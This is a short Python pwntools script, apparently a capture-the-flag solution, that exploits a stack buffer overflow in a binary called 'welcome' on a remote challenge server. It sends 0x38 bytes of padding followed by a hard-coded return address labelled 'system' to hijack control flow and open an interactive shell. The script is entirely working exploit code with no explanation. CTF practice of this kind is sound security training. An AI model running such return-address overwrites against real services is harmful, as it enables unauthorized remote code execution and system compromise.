from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch="amd64", os='linux')
e = ELF('./welcome')

r = remote("pwn.h4ckingga.me", 10001)

system = p64(0x00000000004006c7)
dummy = b"A"*0x38

payload  = dummy
payload += system

r.send(payload)

r.interactive()